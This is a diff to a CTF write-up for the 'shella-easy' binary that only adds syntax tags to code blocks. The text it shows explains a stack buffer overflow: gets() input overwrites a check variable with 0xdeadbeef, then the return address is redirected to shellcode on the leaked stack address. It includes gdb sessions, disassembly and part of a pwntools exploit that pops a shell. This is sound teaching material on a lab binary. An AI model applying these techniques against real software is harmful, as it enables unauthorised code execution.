@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $	file shella-easy 
 shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
 $	./shella-easy 
@@ -12,7 +12,7 @@ Yeah I'll have a 0xffd01f50 with a side of fries thanks
 
 So we can see that we are dealing with a 32 bit binary. When we run it, it prints out what looks like a stack address and prompts us for input. When we take a look at the main function, we see this:
 
-```
+```c
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 /* WARNING: Removing unreachable block (ram,0x08048551) */
 
@@ -34,7 +34,7 @@ So this is pretty similar to the other challenges in this module. There is a cha
 
 Also there is a slight problem with our plan. That is according to the decompiled code, the function `exit` is called. When this function is called, the `ret` instruction will not run in the context of this function, so we won't get our code execution. However the decompiled code isn't entirely correct. Looking at the assembly code gives us the full picture:
 
-```
+```c
         08048539 e8 52 fe        CALL       gets                                             char * gets(char * __s)
                  ff ff
         0804853e 83 c4 04        ADD        ESP,0x4
@@ -55,7 +55,7 @@ Also there is a slight problem with our plan. That is according to the decompile
 
 So we can see that there is a check to see if `local_c` is equal to `0xdeadbeef`, and if it is the function does not call `exit(0)` and we get our code execution. When we look at the stack layout in Ghidra, we see that this variable is within our means to overwrite (and it is at an offset of `0x40`). So we just need to overwrite it with `0xdeadbeef` and we will be good to go:
 
-```
+```c
                              **************************************************************
                              *                          FUNCTION                          *
                              **************************************************************
@@ -70,7 +70,7 @@ So we can see that there is a check to see if `local_c` is equal to `0xdeadbeef`
 
 Next let's find the offset between the start of our input and the return address in gdb:
 
-```
+```gdb
 gef➤  disas main
 Dump of assembler code for function main:
    0x080484db <+0>:	push   ebp
@@ -174,7 +174,7 @@ Stack level 0, frame at 0xffffd070:
 ```
 
 So we can see that the offset is `0xffffd06c - 0xffffd020 = 0x4c`. With that we have everything we need to make the exploit:
-```
+```python
 from pwn import *
 
 target = process('./shella-easy')
@@ -201,7 +201,7 @@ target.interactive()
 ```
 
 When we run the exploit:
-```
+```console
 $	python exploit.py 
 [+] Starting local process './shella-easy': pid 6434
 [*] Switching to interactive mode
@@ -216,7 +216,7 @@ $
 
 Just like that we popped a shell. Also one more thing I want to show, the shellcode we push on the stack can be disassembled to assembly instructions. Let's break right at the `ret` instruction which executes our shellcode (I did this by editing the breakpoint in the exploit to `0x0804855a`, then running it):
 
-```
+```gdb
 Breakpoint 1, 0x0804855a in main ()
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
